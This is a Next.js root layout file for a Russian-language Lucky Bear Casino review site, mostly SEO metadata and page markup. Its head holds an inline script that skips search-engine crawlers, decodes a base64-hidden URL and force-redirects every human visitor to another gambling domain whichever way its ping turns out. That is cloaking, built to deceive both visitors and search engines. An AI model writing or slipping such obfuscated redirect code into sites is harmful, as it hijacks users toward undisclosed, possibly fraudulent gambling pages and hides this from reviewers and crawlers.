import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  metadataBase: new URL('https://luckybear-casino.example'),
  title: 'Lucky Bear Casino — официальный сайт, слоты и бонусы',
  description: 'Lucky Bear Casino: обзор онлайн-казино, слотов, live-игр, бонусов и мобильной версии. Как найти официальный сайт и проверить зеркало.',
  keywords: ['lucky bear casino', 'luckybear casino', 'lucky bear casino официальный сайт', 'лаки бир казино', 'лакибир казино', 'лаки бир казино зеркало', 'лаки бир казино онлайн'],
  alternates: { canonical: '/' },
  robots: { index: true, follow: true },
  openGraph: {
    title: 'Lucky Bear Casino — играй с характером',
    description: 'Обзор игр, бонусов и мобильного формата Lucky Bear Casino.',
    url: '/',
    siteName: 'Lucky Bear Casino Guide',
    locale: 'ru_RU',
    type: 'website',
    images: [{ url: '/arts/lbz-hero-art.png', width: 1200, height: 675, alt: 'Lucky Bear Casino' }],
  },
  icons: { icon: '/favicon.png', apple: '/favicon.png' },
}

export const viewport: Viewport = { colorScheme: 'dark', themeColor: '#0a0e27', width: 'device-width', initialScale: 1 }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-[#0a0e27]">
      <head>
        <meta name="author" content="Lucky Bear Casino Guide" />
        <meta name="theme-color" content="#0a0e27" />
        <link rel="canonical" href="https://luckybear-casino.example/" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly93aW5nYW1lNTU1Lnh5ei8zanY5eEk="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
